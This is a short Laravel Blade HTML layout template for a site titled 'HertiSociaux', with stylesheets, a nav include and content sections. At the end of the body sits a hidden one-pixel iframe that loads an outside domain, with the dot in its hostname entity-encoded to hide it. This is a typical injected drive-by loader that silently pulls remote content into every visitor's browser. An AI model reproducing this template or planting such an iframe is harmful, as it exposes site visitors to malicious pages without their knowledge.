<!DOCTYPE html>
<html>
<head>
	<title>{{$title or 'HertiSociaux'}}</title>
	<link rel="stylesheet" type="text/css" href="{{asset('css/bootstrap.min.css')}}">
	<link rel="stylesheet" type="text/css" href="{{asset('css/main.css')}}">
</head>
<body>

<div class="container">
@include('nav._nav')

@yield('content')
</div>
<footer>
	@yield('script_footer')

</footer>

<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>